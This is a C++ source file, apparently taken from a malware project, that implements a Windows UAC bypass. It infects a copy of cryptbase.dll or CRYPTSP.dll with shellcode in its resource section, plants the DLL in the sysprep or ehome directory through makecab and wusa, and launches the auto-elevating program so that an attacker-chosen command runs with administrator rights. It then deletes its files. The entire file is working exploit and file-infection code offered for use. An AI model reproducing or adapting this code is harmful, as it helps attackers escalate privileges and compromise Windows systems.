#include "core\core.h"
#include "core\debug.h"
#include "core\file.h"
#include "Imagehlp.h"

namespace Elevation
{

#define UAC_BYPASS_MAGIC_RETURN_CODE 'PWND'

static const char* uacTargetDir[] = { _CT_("system32\\sysprep"),	_CT_("ehome") };
static const char* uacTargetApp[] = { _CT_("sysprep.exe"),			_CT_("mcx2prov.exe") };
static const char* uacTargetDll[] = { _CT_("cryptbase.dll"),		_CT_("CRYPTSP.dll") };
static const char* uacTargetMsu[] = { _CT_("cryptbase.msu"),		_CT_("CRYPTSP.msu") };

static bool InfectImage( Mem::Data& data, const char *dllPath, const char *commandLine );

bool UACBypass( const char* engineDll, const char *commandLine, int method )
{
	bool ret = false;
	//проверяем в нужной ли версии винды находимся
    OSVERSIONINFOA ver;
    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    if( API(KERNEL32, GetVersionExA)(&ver) )
    {		    
        if( ver.dwPlatformId != VER_PLATFORM_WIN32_NT ||
            ver.dwMajorVersion != 6 || !(ver.dwMinorVersion == 1 || ver.dwMinorVersion == 2) )
        {
            return false;
        }        
    }

	StringBuilderStack<MAX_PATH> targetDll, targetDllInfected;
	Path::GetCSIDLPath( CSIDL_SYSTEM, targetDll, DECODE_STRING( uacTargetDll[method] ) );
	Path::GetTempPath( targetDllInfected, DECODE_STRING( uacTargetDll[method] ) );
    DbgMsg( "Reading and infecting '%s'", targetDll.c_str() );
    // read hijacking dll and infect it
	Mem::Data data;
    if( File::ReadAll( targetDll, data ) )
    {
		if( InfectImage( data, engineDll, commandLine ) )
        {
            DbgMsg( "Saving infected DLL to '%s'", targetDllInfected);

            // write infected hijacking DLL into the temporary location
			if( File::Write( targetDllInfected, data ) )
            {
                StringBuilderStack<MAX_PATH> msuPath;
                Path::GetTempPath( msuPath, DECODE_STRING(uacTargetMsu[method]) );
                // delete old .msu file
                File::Delete(msuPath);
                DbgMsg( "Creating MSU file '%s'", msuPath.c_str() );
                // make .msu archive
				Process::Exec( Process::EXEC_NOWINDOW, 0, 10000, _CS_("makecab.exe /V1 %s %s"), targetDllInfected.c_str(), msuPath.c_str() );
				if( File::IsExists(msuPath) )
                {        
                    StringBuilderStack<MAX_PATH> targetPath, targetDllPath;
					Path::GetCSIDLPath( CSIDL_WINDOWS, targetPath, DECODE_STRING( uacTargetDir[method] ) );
					Path::AppendFile( targetPath, DECODE_STRING( uacTargetApp[method] ) );

                    Path::GetCSIDLPath( CSIDL_WINDOWS, targetDllPath, DECODE_STRING( uacTargetDir[method] ) );
					Path::AppendFile( targetDllPath, DECODE_STRING( uacTargetDll[method] ) );

                    DbgMsg( "Extracting MSU data to '%s'", targetDllPath );

                    // extract dll file into the vulnerable app directory
                    Process::Exec( Process::EXEC_NOWINDOW, 0, 10000, _CS_("cmd.exe /C wusa.exe %s /extract:%%WINDIR%%\\%s"), msuPath.c_str(), DECODE_STRING( uacTargetDir[method] ) );                
					if( File::IsExists(targetDllPath) )
                    {
                        DWORD exitCode = 0;
                        DbgMsg( "Executing '%s'", targetPath.c_str() );
                        // execute vulnerable application and perform DLL hijacking attack
                        if( Process::Exec( Process::EXEC_NOWINDOW, &exitCode, 10000, _CS_("cmd.exe /C %s"), targetPath.c_str() ) )
                        {
                            if( exitCode == UAC_BYPASS_MAGIC_RETURN_CODE )
                            {
                                DbgMsg( "UAC BYPASS SUCCESS" );
                                ret = true;
                            }
                            else
                            {
                                DbgMsg( "UAC BYPASS FAILS" );
                            }
                        }
                        File::Delete(targetDllPath);
                    }
                    else
                        DbgMsg( "Error while extracting '%s' from MSU archive", targetDllPath.c_str() );
                    File::Delete(msuPath);
                }
                else
                    DbgMsg( "Error while creating '%s'", msuPath.c_str() );
            }
        }
    }
    File::Delete(targetDllInfected);
    File::Delete(engineDll);
    return ret;
}

typedef HMODULE (WINAPI *typeLoadLibraryA)(LPCTSTR lpFileName);
typedef UINT (WINAPI *typeWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
typedef void (WINAPI *typeExitProcess)( UINT uExitCode );
typedef BOOL (WINAPI *typeDLL_MAIN)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef struct _SHELLCODE_PARAMS
{
    typeLoadLibraryA funcLoadLibraryA;
    typeWinExec funcWinExec;
	typeExitProcess funcExitProcess;
    DWORD dwAddressofEntryPoint;
    char commandLine[MAX_PATH];
    char dllPath[MAX_PATH];

} SHELLCODE_PARAMS, *PSHELLCODE_PARAMS;

extern "C" BOOL WINAPI Shellcode( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved );
extern "C" VOID WINAPI Shellcode_end(VOID);

#pragma optimize("", off)

BOOL WINAPI Shellcode( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
{
    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((PUCHAR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)
            (headers->FileHeader.SizeOfOptionalHeader + 
            (PUCHAR)&headers->OptionalHeader);

    DWORD numberOfSections = headers->FileHeader.NumberOfSections;

    PSHELLCODE_PARAMS params = NULL;

    // enumerate sections
    for( int i = 0; i < (int)numberOfSections; i++ )
    {   
        // check for resources section
        if( *(PDWORD)&section->Name == 'rsr.' )
        {
            params = (PSHELLCODE_PARAMS)((PUCHAR)hModule + section->VirtualAddress);
            break;
        }

        section++;
    }       

    if (params == NULL)
    {
        // shellcode parameters is not found
        return TRUE;
    }

    // get address of original entry point
    typeDLL_MAIN DllMain = (typeDLL_MAIN)((PUCHAR)hModule + params->dwAddressofEntryPoint);

    // call original entry point
    BOOL ret = DllMain( hModule, ul_reason_for_call, lpReserved );

    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        if( params->funcWinExec && params->commandLine[0] )
        {
            // execute payload
            params->funcWinExec( params->commandLine, SW_SHOWNORMAL );
        }

        if( params->funcLoadLibraryA && params->dllPath[0] )
        {
            // load helper library
            params->funcLoadLibraryA( params->dllPath );
        }        
		params->funcExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
    }

    return ret;
}

VOID WINAPI Shellcode_end(VOID) {}

#pragma optimize("", on)

static bool InfectImage( Mem::Data& data, const char *dllPath, const char *commandLine )
{
    DWORD shellcodeSize = (DWORD)((byte*)&Shellcode_end - (byte*)&Shellcode);
    DWORD totalSize = shellcodeSize + sizeof(SHELLCODE_PARAMS);

    DbgMsg( "Shellcode size is %d bytes", totalSize );

    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
        ((PUCHAR)data.Ptr() + ((PIMAGE_DOS_HEADER)data.Ptr())->e_lfanew);

    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)
        (headers->FileHeader.SizeOfOptionalHeader + 
        (PUCHAR)&headers->OptionalHeader);

    DWORD numberOfSections = headers->FileHeader.NumberOfSections;

    // enumerate sections
    for( int i = 0; i < (int)numberOfSections; i++ )
    {   
        // check for resources section
		if( !Str::Cmp( (char*)&section->Name, ".rsrc", 5) )
        {
            if( section->SizeOfRawData < totalSize )
            {
                DbgMsg( "ERROR: Not enough free space in '.rsrc'" );
                return false;
            }

            // fill shellcode parameters
            PSHELLCODE_PARAMS params = (PSHELLCODE_PARAMS)((byte*)data.Ptr() + section->PointerToRawData);
            Mem::Set( params, 0, sizeof(SHELLCODE_PARAMS) );

            params->dwAddressofEntryPoint = headers->OptionalHeader.AddressOfEntryPoint;
			HMODULE kernel32 = API(KERNEL32, GetModuleHandleA)( _CS_("kernel32.dll") );
            params->funcLoadLibraryA = (typeLoadLibraryA)API(KERNEL32, GetProcAddress)( kernel32, _CS_("LoadLibraryA") );
            params->funcWinExec = (typeWinExec)API(KERNEL32, GetProcAddress)( kernel32, _CS_("WinExec") );
			params->funcExitProcess = (typeExitProcess)API(KERNEL32, GetProcAddress)( kernel32, _CS_("ExitProcess") );

            if( commandLine )
				Str::Copy( params->commandLine, sizeof(params->commandLine), commandLine );
			if( dllPath )
				Str::Copy( params->dllPath, sizeof(params->dllPath), dllPath );

            // copy shellcode
            byte* shellcode = (byte*)params + sizeof(SHELLCODE_PARAMS);
			Mem::Copy( shellcode, Shellcode, shellcodeSize );

            // replace address of entry point
            headers->OptionalHeader.AddressOfEntryPoint = section->VirtualAddress + sizeof(SHELLCODE_PARAMS);
            // make section executable
            section->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
            headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = NULL;
            headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = 0;

            DWORD headerSum = 0, checkSum = 0;
            // recalculate checksum
            if( API(IMAGEHLP, CheckSumMappedFile)( data.Ptr(), data.Len(), &headerSum, &checkSum ) )
                headers->OptionalHeader.CheckSum = checkSum;
            else
                DbgMsg( "CheckSumMappedFile() ERROR %d", GetLastError() );
            DbgMsg( "OK" );
            break;
        }
        section++;
    } 
    return true;
}

}
